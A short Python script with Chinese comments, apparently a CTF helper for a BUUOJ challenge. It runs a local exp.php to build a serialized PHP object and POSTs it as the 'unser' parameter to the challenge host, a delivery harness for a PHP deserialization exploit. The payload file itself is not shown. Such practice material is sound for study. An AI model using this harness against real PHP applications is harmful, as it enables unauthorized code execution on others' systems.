# 注意 requests.get 如果使用params传参，会自动添加一层url编码。。。
# 如果php已经urlencode了，手动解码再发，或者不要使用params
import os
from urllib.parse import unquote
import subprocess
from requests_html import HTMLSession
import re

url = 'http://366a153f-115e-46e1-b214-49b94b3c423b.node4.buuoj.cn:81/'
key = 'unser'
php = r'D:\phpstudy_pro\Extensions\php\php7.3.4nts\php.exe'

s = HTMLSession()
output = subprocess.getoutput(f'{php} exp.php')

ser = re.search(r'O:.*', output).group()

data = {key: ser}


def get():
    res = s.post(url, params=data)
    return res.text


def post():
    res = s.post(url, data=data)
    return res.text


# print(get())
print(post())
